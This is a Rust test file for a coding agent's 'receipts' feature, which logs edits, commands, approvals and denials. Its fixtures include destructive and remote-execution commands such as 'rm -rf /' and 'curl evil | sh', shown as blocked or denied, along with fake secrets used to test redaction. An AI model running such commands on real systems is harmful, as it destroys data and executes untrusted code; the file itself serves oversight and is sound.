use super::*;
use codewhale_models::Role;
use serde_json::json;

fn thread_fixture() -> (
    ThreadRecord,
    Vec<TurnRecord>,
    Vec<TurnItemRecord>,
    Vec<RuntimeEventRecord>,
) {
    let thread: ThreadRecord = serde_json::from_value(json!({
        "id": "thr_fixture",
        "created_at": "2026-09-24T10:00:00Z",
        "updated_at": "2026-09-24T10:05:00Z",
        "model": "deepseek-flash",
        "workspace": "/work/repo",
        "mode": "agent",
        "allow_shell": true,
        "trust_mode": false,
        "auto_approve": false,
        "title": "Fix the parser"
    }))
    .expect("thread fixture");
    let turns: Vec<TurnRecord> = serde_json::from_value(json!([
        {
            "id": "turn_1",
            "thread_id": "thr_fixture",
            "status": "completed",
            "input_summary": "Fix the parser",
            "created_at": "2026-09-24T10:00:00Z",
            "permission_posture": "ask",
            "item_ids": ["item_edit", "item_test", "item_rm", "item_mcp", "item_read", "item_fail"]
        },
        {
            "id": "turn_2",
            "thread_id": "thr_fixture",
            "status": "failed",
            "input_summary": "Push it",
            "created_at": "2026-09-24T10:04:00Z",
            "ended_at": "2026-09-24T10:04:30Z",
            "error": "provider returned 500",
            "item_ids": []
        }
    ]))
    .expect("turn fixtures");
    let item =
        |id: &str, kind: &str, status: &str, at: &str, end: &str, detail: &str, meta: Value| {
            serde_json::from_value::<TurnItemRecord>(json!({
                "id": id,
                "turn_id": "turn_1",
                "kind": kind,
                "status": status,
                "summary": detail,
                "detail": detail,
                "metadata": meta,
                "started_at": at,
                "ended_at": end,
            }))
            .expect("item fixture")
        };
    let items = vec![
        item(
            "item_edit",
            "file_change",
            "completed",
            "2026-09-24T10:01:00Z",
            "2026-09-24T10:01:01Z",
            "Successfully replaced 1 block(s) in src/parse.rs.",
            json!({
                "tool_use_id": "call_edit",
                "tool_name": "edit",
                "tool_input": "{\"path\":\"src/parse.rs\"}",
                "mutation": {
                    "files": [{"path": "src/parse.rs", "outcome": "updated"}],
                    "diff": "diff --git a/src/parse.rs b/src/parse.rs\n--- a/src/parse.rs\n+++ b/src/parse.rs\n@@ -1,2 +1,3 @@\n-old\n+new\n+more\n",
                    "renames": []
                }
            }),
        ),
        item(
            "item_test",
            "command_execution",
            "completed",
            "2026-09-24T10:02:00Z",
            "2026-09-24T10:02:03Z",
            "test result: ok",
            json!({
                "tool_use_id": "call_test",
                "tool_name": "exec_shell",
                "tool_input": "{\"command\":\"cargo test -p parser\",\"cwd\":\"/work/repo\"}",
                "exit_code": 0,
                "duration_ms": 2500
            }),
        ),
        item(
            "item_rm",
            "command_execution",
            "failed",
            "2026-09-24T10:02:30Z",
            "2026-09-24T10:02:31Z",
            "Tool call denied by user",
            json!({
                "tool_use_id": "call_rm",
                "tool_name": "exec_shell",
                "tool_input": "{\"command\":\"rm -rf build API_KEY=sk-live-abcdefghijklmnop\"}"
            }),
        ),
        item(
            "item_mcp",
            "tool_call",
            "completed",
            "2026-09-24T10:03:00Z",
            "2026-09-24T10:03:01Z",
            "{\"issues\":[]}",
            json!({
                "tool_use_id": "call_mcp",
                "tool_name": "mcp_linear_list_issues",
                "tool_input": "{}"
            }),
        ),
        item(
            "item_read",
            "tool_call",
            "completed",
            "2026-09-24T10:03:10Z",
            "2026-09-24T10:03:11Z",
            "fn main() {}",
            json!({"tool_use_id": "call_read", "tool_name": "read", "tool_input": "{\"path\":\"src/main.rs\"}"}),
        ),
        item(
            "item_fail",
            "tool_call",
            "failed",
            "2026-09-24T10:03:20Z",
            "2026-09-24T10:03:21Z",
            "Failed to execute tool: no such file\nmore",
            json!({"tool_use_id": "call_fail", "tool_name": "read", "tool_input": "{\"path\":\"missing.rs\"}"}),
        ),
    ];
    let event = |seq: u64, name: &str, at: &str, payload: Value| RuntimeEventRecord {
        schema_version: 2,
        seq,
        timestamp: at.parse().expect("timestamp"),
        thread_id: "thr_fixture".into(),
        turn_id: Some("turn_1".into()),
        item_id: None,
        event: name.into(),
        payload,
    };
    let events = vec![
        event(
            1,
            "approval.required",
            "2026-09-24T10:01:58Z",
            json!({"approval_id": "apr_1", "tool_call_id": "call_test", "tool_name": "exec_shell"}),
        ),
        event(
            2,
            "approval.decided",
            "2026-09-24T10:01:59Z",
            json!({"approval_id": "apr_1", "tool_call_id": "call_test", "decision": "allow", "remember": false}),
        ),
        event(
            3,
            "approval.required",
            "2026-09-24T10:02:29Z",
            json!({"approval_id": "apr_2", "tool_call_id": "call_rm", "tool_name": "exec_shell"}),
        ),
        event(
            4,
            "approval.decided",
            "2026-09-24T10:02:30Z",
            json!({"approval_id": "apr_2", "tool_call_id": "call_rm", "decision": "deny", "remember": false}),
        ),
        event(
            5,
            "approval.required",
            "2026-09-24T10:02:59Z",
            json!({"approval_id": "apr_3", "tool_call_id": "call_mcp", "tool_name": "mcp_linear_list_issues"}),
        ),
        event(
            6,
            "approval.decided",
            "2026-09-24T10:03:00Z",
            json!({"approval_id": "apr_3", "tool_call_id": "call_mcp", "decision": "allow", "auto": true, "grant_id": "grant_9"}),
        ),
    ];
    (thread, turns, items, events)
}

#[test]
fn thread_receipt_lists_files_commands_approvals_mcp_and_failures() {
    let (thread, turns, items, events) = thread_fixture();
    let receipt = thread_receipt(&thread, &turns, &items, &events, None).expect("receipt");

    let totals = &receipt.totals;
    assert_eq!(totals.files_changed, 1);
    assert_eq!((totals.lines_added, totals.lines_removed), (2, 1));
    assert!(totals.line_counts_complete);
    assert_eq!(totals.commands, 1, "the denied command never ran");
    assert_eq!(totals.mcp_calls, 1);
    assert_eq!(totals.approvals.total, 3);
    assert_eq!(totals.approvals.approved, 2);
    assert_eq!(totals.approvals.approved_by.you, 1);
    assert_eq!(totals.approvals.approved_by.session_rule, 1);
    assert_eq!(totals.approvals.denied, 1);
    assert_eq!(totals.approvals.denied_by.you, 1);
    assert_eq!(totals.failures, 2, "failed read + failed turn");
    assert_eq!(totals.other_tool_calls, 2);
    assert_eq!(receipt.postures, vec!["Ask"]);
    assert_eq!(
        totals.ran_without_asking, 1,
        "the edit ran with no approval; reads are not counted"
    );

    let lines: Vec<String> = receipt.actions.iter().map(action_line).collect();
    assert_eq!(
        lines,
        vec![
            "edited src/parse.rs (+2 −1) · 1.0s",
            "ran `cargo test -p parser` in /work/repo — exit 0 · 2.5s · approved by you",
            "did not run `rm -rf build API_KEY=[redacted]` · denied by you",
            "called linear · list_issues · 1.0s · approved by session rule",
            "called read — failed: Failed to execute tool: no such file · 1.0s",
            "turn failed — failed: provider returned 500",
        ]
        .into_iter()
        .map(str::to_string)
        .collect::<Vec<_>>(),
    );
    assert!(
        !render_json(&receipt).contains("sk-live-abcdefghijklmnop"),
        "a secret in a command never reaches the receipt"
    );
}

#[test]
fn thread_receipt_scopes_to_one_turn_and_rejects_foreign_turns() {
    let (thread, turns, items, events) = thread_fixture();
    let receipt = thread_receipt(&thread, &turns, &items, &events, Some("turn_2")).expect("turn");
    assert_eq!(receipt.turn.as_deref(), Some("turn_2"));
    assert_eq!(receipt.actions.len(), 1);
    assert_eq!(receipt.actions[0].what, ActionKind::TurnFailed);
    assert_eq!(receipt.totals.approvals.total, 0);

    let error = thread_receipt(&thread, &turns, &items, &events, Some("turn_other"))
        .expect_err("foreign turn");
    assert!(error.to_string().contains("does not belong"));
}

fn text(role: Role, text: &str) -> Message {
    Message {
        role,
        content: vec![ContentBlock::Text {
            text: text.into(),
            cache_control: None,
        }],
    }
}

fn tool_use(id: &str, name: &str, input: Value) -> Message {
    Message {
        role: Role::Assistant,
        content: vec![ContentBlock::ToolUse {
            id: id.into(),
            name: name.into(),
            input,
            caller: None,
            thought_signature: None,
        }],
    }
}

fn tool_result(id: &str, content: &str, is_error: bool) -> Message {
    Message {
        role: Role::User,
        content: vec![ContentBlock::ToolResult {
            tool_use_id: id.into(),
            content: content.into(),
            is_error: is_error.then_some(true),
            content_blocks: None,
        }],
    }
}

fn session_source_fixture() -> ReceiptSource {
    ReceiptSource {
        kind: SourceKind::Session,
        id: "sess-1".into(),
        title: None,
        workspace: None,
        model: None,
        started_at: None,
        updated_at: None,
    }
}

/// A prompt as the engine saves it: the user's text, then the host's
/// `<turn_meta>` block naming the posture.
fn prompt_with_posture(prompt: &str, posture: &str) -> Message {
    Message {
        role: Role::User,
        content: vec![
            ContentBlock::Text {
                text: prompt.into(),
                cache_control: None,
            },
            ContentBlock::Text {
                text: format!(
                    "<turn_meta>\nCurrent local date: 2026-09-24\n{}{posture}\n</turn_meta>",
                    crate::core::engine::PERMISSION_POSTURE_LINE
                ),
                cache_control: None,
            },
        ],
    }
}

#[test]
fn session_receipt_reads_transcript_and_approval_log_with_deciders() {
    let messages = vec![
        // Runtime-injected, not a prompt: it must not start turn 1.
        crate::runtime_handoff::operate_contract_runtime_message(),
        prompt_with_posture("tidy the repo", "Full Access"),
        tool_use(
            "c1",
            "write",
            json!({"path": "notes.md", "content": "a\nb\n"}),
        ),
        tool_result("c1", "Successfully wrote 4 bytes to notes.md", false),
        tool_use(
            "c2",
            "edit",
            json!({"path": "src/lib.rs", "edits": [{"oldText": "a", "newText": "b\nc"}]}),
        ),
        tool_result("c2", "Successfully replaced 1 block(s)", false),
        tool_use("c3", "bash", json!({"command": "cargo build"})),
        tool_result(
            "c3",
            "error[E0425]: cannot find value\n\nCommand exited with code 101",
            true,
        ),
        text(Role::User, "now delete build"),
        tool_use("c4", "bash", json!({"command": "rm -rf build"})),
        tool_result("c4", "The user denied this tool call.", true),
        tool_use(
            "c5",
            "Web",
            json!({"action": "fetch", "url": "https://docs.rs/serde"}),
        ),
        tool_result("c5", "<html>", false),
        tool_use(
            "c6",
            "agent",
            json!({"action": "start", "name": "reviewer"}),
        ),
        tool_result(
            "c6",
            "{\"agent_id\":\"agent_1\",\"status\":\"running\"}",
            false,
        ),
        tool_use(
            "c7",
            "agent",
            json!({"action": "wait", "agent_id": "agent_1"}),
        ),
        tool_result(
            "c7",
            "{\"agent_id\":\"agent_1\",\"status\":\"completed\"}",
            false,
        ),
    ];
    let receipts = vec![
        ApprovalReceipt::asked("c3", "bash"),
        ApprovalReceipt::decided_with(
            "c3",
            ApprovalOutcome::ApprovedOnce,
            Some(ApprovalDecider::Posture),
        ),
        ApprovalReceipt::asked("c4", "bash"),
        ApprovalReceipt::decided_with("c4", ApprovalOutcome::Denied, Some(ApprovalDecider::User)),
        // A record written before deciders were kept.
        ApprovalReceipt::asked("c5", "Web"),
        ApprovalReceipt::decided("c5", ApprovalOutcome::ApprovedOnce),
    ];
    let receipt =
        session_receipt(session_source_fixture(), &messages, &receipts, None).expect("receipt");

    let lines: Vec<String> = receipt.actions.iter().map(action_line).collect();
    assert_eq!(
        lines,
        vec![
            "wrote notes.md",
            "edited src/lib.rs (+2 −1)",
            "ran `cargo build` — exit 101 — failed: error[E0425]: cannot find value · approved by posture",
            "did not run `rm -rf build` · denied by you",
            "fetched docs.rs · approved",
            "started agent reviewer — completed",
        ]
        .into_iter()
        .map(str::to_string)
        .collect::<Vec<_>>(),
    );
    assert_eq!(receipt.actions[3].turn.as_deref(), Some("2"));
    let totals = &receipt.totals;
    assert_eq!(totals.files_changed, 2);
    assert!(
        !totals.line_counts_complete,
        "a whole-file write has no counts"
    );
    assert_eq!((totals.commands, totals.commands_failed), (1, 1));
    assert_eq!(totals.network, 1);
    assert_eq!(totals.subagents, 1);
    assert_eq!(totals.approvals.approved_by.posture, 1);
    assert_eq!(totals.approvals.approved_by.not_recorded, 1);
    assert_eq!(totals.approvals.denied_by.you, 1);
    assert_eq!(receipt.postures, vec!["Full Access"]);
    assert_eq!(
        totals.ran_without_asking, 3,
        "the write, the edit, and the agent start had no approval on record"
    );
    assert!(
        totals_line(&receipt).contains("3 ran without asking under Full Access"),
        "{}",
        totals_line(&receipt)
    );
    assert!(
        receipt
            .not_recorded
            .iter()
            .any(|note| note.starts_with("Who decided: 1 decision")),
        "{:?}",
        receipt.not_recorded
    );

    let turn_two =
        session_receipt(session_source_fixture(), &messages, &receipts, Some("2")).expect("turn 2");
    assert_eq!(turn_two.actions.len(), 3);
    for missing in ["x", "0", "3", "999"] {
        let error = session_receipt(
            session_source_fixture(),
            &messages,
            &receipts,
            Some(missing),
        )
        .expect_err("a turn this session does not have");
        assert!(error.to_string().contains("it has 2 turns"), "{error}");
    }
}

#[test]
fn markdown_and_json_share_one_record() {
    let (thread, turns, items, events) = thread_fixture();
    let receipt = thread_receipt(&thread, &turns, &items, &events, None).expect("receipt");

    let markdown = render_markdown(&receipt);
    assert!(markdown.starts_with("# Receipt: Fix the parser\n"));
    assert!(markdown.contains(
        "Changed 1 file (+2 −1) · ran 1 command · made 1 MCP call · 1 approved by you · 1 approved by session rule · 1 ran without asking under Ask · 1 denied by you · 2 other failures"
    ));
    assert!(markdown.contains("\n1. edited src/parse.rs (+2 −1)"));
    assert!(markdown.contains("\nNot recorded:\n- Shell file changes:"));

    let json: Value = serde_json::from_str(&render_json(&receipt)).expect("json");
    assert_eq!(json["schema_id"], RECEIPT_SCHEMA_ID);
    assert_eq!(json["source"]["kind"], "thread");
    assert_eq!(json["source"]["id"], "thr_fixture");
    assert_eq!(json["totals"]["approvals"]["approved_by"]["you"], 1);
    assert_eq!(json["totals"]["approvals"]["denied_by"]["you"], 1);
    let actions = json["actions"].as_array().expect("actions");
    assert_eq!(actions.len(), receipt.actions.len());
    assert_eq!(actions[0]["kind"], "file_change");
    assert_eq!(actions[0]["files"][0]["lines_added"], 2);
    assert_eq!(actions[1]["kind"], "command");
    assert_eq!(actions[1]["exit_code"], 0);
    assert_eq!(actions[1]["approval"]["decided_by"], "user");
    assert_eq!(actions[2]["status"], "not_run");
    assert_eq!(actions[3]["kind"], "mcp");
    assert_eq!(actions[3]["server"], "linear");
    assert_eq!(actions[3]["approval"]["decided_by"], "session_rule");
    assert_eq!(json["claim_ceiling"][0], "local_record_only");
}

#[test]
fn empty_session_says_nothing_happened() {
    let receipt = session_receipt(session_source_fixture(), &[], &[], None).expect("receipt");
    assert_eq!(totals_line(&receipt), "No actions recorded.");
    assert!(receipt.actions.is_empty());
}

#[test]
fn receipts_cli_parses_id_last_turn_and_format() {
    use clap::Parser as _;
    let cli = crate::Cli::try_parse_from(["codewhale", "receipts", "--last", "--format", "json"])
        .expect("parse --last");
    assert!(matches!(
        cli.command,
        Some(crate::Commands::Receipts {
            last: true,
            id: None,
            format: ReceiptFormat::Json,
            ..
        })
    ));
    let cli = crate::Cli::try_parse_from(["codewhale", "receipt", "thr_1", "--turn", "turn_2"])
        .expect("parse alias");
    assert!(matches!(
        cli.command,
        Some(crate::Commands::Receipts { ref id, ref turn, format: ReceiptFormat::Md, .. })
            if id.as_deref() == Some("thr_1") && turn.as_deref() == Some("turn_2")
    ));
    assert!(
        crate::Cli::try_parse_from(["codewhale", "receipts", "abc", "--last"]).is_err(),
        "an id and --last conflict"
    );
}

#[test]
fn session_older_than_its_approval_log_does_not_claim_calls_ran_without_asking() {
    let messages = vec![
        text(Role::User, "write it"),
        tool_use("c1", "write", json!({"path": "notes.md", "content": "a"})),
        tool_result("c1", "Successfully wrote 1 byte to notes.md", false),
    ];
    let mut source = session_source_fixture();
    source.started_at = Some("2026-08-01T00:00:00Z".parse().expect("time"));
    let receipt = session_receipt(source, &messages, &[], None).expect("receipt");
    assert_eq!(receipt.totals.files_changed, 1);
    assert_eq!(receipt.totals.ran_without_asking, 0);
    assert!(
        receipt
            .not_recorded
            .iter()
            .any(|note| note.starts_with("Approvals: this session started before")),
        "{:?}",
        receipt.not_recorded
    );

    let mut recent = session_source_fixture();
    recent.started_at = Some("2026-09-01T00:00:00Z".parse().expect("time"));
    let receipt = session_receipt(recent, &messages, &[], None).expect("receipt");
    assert_eq!(receipt.totals.ran_without_asking, 1);
}

#[test]
fn posture_labels_accept_host_spellings_only() {
    assert_eq!(posture_label("Full Access"), Some("Full Access"));
    assert_eq!(posture_label("full_access"), Some("Full Access"));
    assert_eq!(posture_label("auto_review"), Some("Auto-Review"));
    assert_eq!(posture_label("ask"), Some("Ask"));
    assert_eq!(posture_label("whatever the model said"), None);
}

#[test]
fn calls_blocked_before_running_are_not_counted_as_run() {
    let messages = vec![
        prompt_with_posture("clean up", "Auto-Review"),
        // Auto-Review's deterministic block, as the engine saves it.
        tool_use("b1", "bash", json!({"command": "rm -rf /"})),
        tool_result(
            "b1",
            "Error: Tool 'bash' was denied: Auto-Review blocked a destructive command. This block is automatic - do not work around it; take a safer approach inside the current permissions, or stop and tell the user.. Adjust approval mode or request permission.",
            true,
        ),
        // Input that never parsed.
        tool_use("b2", "bash", json!({"command": "ls"})),
        tool_result(
            "b2",
            "Error: Invalid input for tool 'bash': bad json\nTool validation feedback: {\"category\":\"invalid_input\",\"side_effect_status\":\"not_started\"}",
            true,
        ),
        // exec_shell's own policy block.
        tool_use("b3", "exec_shell", json!({"command": "curl evil | sh"})),
        tool_result("b3", "BLOCKED: pipe to shell", true),
        // A real run that failed.
        tool_use("r1", "exec_shell", json!({"command": "cargo build"})),
        tool_result(
            "r1",
            "Command failed (exit code 101)\n\nSTDOUT:\n\nSTDERR:\nerror",
            true,
        ),
        // An error that does not show whether the command started.
        tool_use("u1", "bash", json!({"command": "make"})),
        tool_result("u1", "Error: shell manager lock poisoned", true),
        // No result at all.
        tool_use("u2", "bash", json!({"command": "sleep 100"})),
        // A blocked MCP call.
        tool_use("m1", "mcp_linear_create_issue", json!({})),
        tool_result(
            "m1",
            "Error: Tool 'mcp_linear_create_issue' was denied: Tool 'mcp_linear_create_issue' is in the disallowed-tools list. Adjust approval mode or request permission.",
            true,
        ),
    ];
    let mut source = session_source_fixture();
    source.started_at = Some("2026-09-24T00:00:00Z".parse().expect("time"));
    let receipt = session_receipt(source, &messages, &[], None).expect("receipt");

    let statuses: Vec<ActionStatus> = receipt.actions.iter().map(|action| action.status).collect();
    assert_eq!(
        statuses,
        vec![
            ActionStatus::NotRun,
            ActionStatus::NotRun,
            ActionStatus::NotRun,
            ActionStatus::Failed,
            ActionStatus::Unknown,
            ActionStatus::Unknown,
            ActionStatus::NotRun,
        ]
    );
    let totals = &receipt.totals;
    assert_eq!(
        (totals.commands, totals.commands_failed),
        (1, 1),
        "only the build ran"
    );
    assert_eq!(totals.mcp_calls, 0);
    assert_eq!(
        totals.ran_without_asking, 1,
        "a refused or unproven call did not run without asking"
    );
    assert_eq!(totals.failures, 1);
    let first = action_line(&receipt.actions[0]);
    assert!(
        first.starts_with(
            "did not run `rm -rf /` — refused: Tool 'bash' was denied: Auto-Review blocked"
        ),
        "{first}"
    );
    assert_eq!(
        action_line(&receipt.actions[4]),
        "tried to run `make` — error, no exit code: shell manager lock poisoned"
    );
    assert_eq!(
        action_line(&receipt.actions[5]),
        "tried to run `sleep 100` — no result recorded"
    );
    assert!(
        action_line(&receipt.actions[6])
            .starts_with("did not call linear · create_issue — refused:"),
        "{}",
        action_line(&receipt.actions[6])
    );
    assert!(
        receipt
            .not_recorded
            .iter()
            .any(|note| note.starts_with("Whether it ran: 2 call(s)")),
        "{:?}",
        receipt.not_recorded
    );
}

#[test]
fn thread_call_refused_by_the_runtime_is_not_run() {
    let (thread, turns, mut items, events) = thread_fixture();
    // `item_fail` as the Runtime saves a call it refused: the ToolError text.
    let refused = items
        .iter_mut()
        .find(|item| item.id == "item_fail")
        .expect("fixture item");
    refused.detail = Some(
        "Failed to authorize tool execution: Tool 'read' is in the disallowed-tools list"
            .to_string(),
    );
    let receipt = thread_receipt(&thread, &turns, &items, &events, None).expect("receipt");
    let line = receipt
        .actions
        .iter()
        .find(|action| action.call_id.as_deref() == Some("call_fail"))
        .map(action_line)
        .expect("refused call is listed");
    assert_eq!(
        line,
        "did not call read — refused: Failed to authorize tool execution: Tool 'read' is in the disallowed-tools list"
    );
    assert_eq!(receipt.totals.failures, 1, "only the failed turn");
}

#[test]
fn host_denial_reads_as_not_answered() {
    let messages = vec![
        text(Role::User, "run it"),
        tool_use("h1", "bash", json!({"command": "cargo test"})),
        tool_result(
            "h1",
            "Tool 'bash' denied by user — the call was not approved.",
            true,
        ),
    ];
    let receipts = vec![
        ApprovalReceipt::asked("h1", "bash"),
        ApprovalReceipt::decided_with("h1", ApprovalOutcome::Denied, Some(ApprovalDecider::Host)),
    ];
    let receipt =
        session_receipt(session_source_fixture(), &messages, &receipts, None).expect("receipt");
    let approvals = &receipt.totals.approvals;
    assert_eq!((approvals.denied, approvals.not_answered), (0, 1));
    assert_eq!(
        action_line(&receipt.actions[0]),
        "did not run `cargo test` · nobody could be asked"
    );
    assert!(
        totals_line(&receipt).contains("1 not answered"),
        "{}",
        totals_line(&receipt)
    );
}

#[test]
fn private_key_in_a_heredoc_is_redacted_before_the_command_is_flattened() {
    let key_body = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW";
    let command = format!(
        "cat > id_ed25519 <<'EOF'\n-----BEGIN OPENSSH PRIVATE KEY-----\n{key_body}\n-----END OPENSSH PRIVATE KEY-----\nEOF"
    );
    let text = command_text("bash", "exec_shell", &json!({ "command": command }));
    assert!(!text.contains(key_body), "{text}");
    assert!(
        text.starts_with("cat > id_ed25519 <<'EOF' -----BEGIN OPENSSH PRIVATE KEY-----"),
        "{text}"
    );
}

#[test]
fn diff_comment_lines_are_content_not_headers() {
    // A removed SQL comment `-- old` shows as `--- old`; an added `++ x`
    // as `+++ x`. Inside a hunk neither is a file header.
    let diff = "diff --git a/q.sql b/q.sql\n--- a/q.sql\n+++ b/q.sql\n@@ -1,3 +1,3 @@\n--- old comment\n+++ added\n select 1;\n-x\n+y\n";
    let counts = diff_counts_by_path(diff);
    assert_eq!(counts.len(), 1, "{counts:?}");
    assert_eq!(counts.get("q.sql"), Some(&(2, 2)));

    let files = patch_files(diff, None);
    assert_eq!(files.len(), 1, "{files:?}");
    assert_eq!(
        (files[0].lines_added, files[0].lines_removed),
        (Some(2), Some(2))
    );

    // Two files: the second header is read after the first hunk ends.
    let two = "--- a/a.rs\n+++ b/a.rs\n@@ -1 +1 @@\n-a\n+b\n--- /dev/null\n+++ b/new.rs\n@@ -0,0 +1 @@\n+c\n";
    let files = patch_files(two, None);
    assert_eq!(
        files
            .iter()
            .map(|file| (
                file.path.as_str(),
                file.change,
                file.lines_added,
                file.lines_removed
            ))
            .collect::<Vec<_>>(),
        vec![
            ("a.rs", FileChangeKind::Edited, Some(1), Some(1)),
            ("new.rs", FileChangeKind::Created, Some(1), Some(0)),
        ]
    );
}

#[test]
fn backticks_in_a_command_keep_its_code_span_whole() {
    assert_eq!(code_span("cargo test"), "`cargo test`");
    assert_eq!(code_span("echo `date`"), "`` echo `date` ``");
    assert_eq!(code_span("a ``b`` c"), "```a ``b`` c```");
}
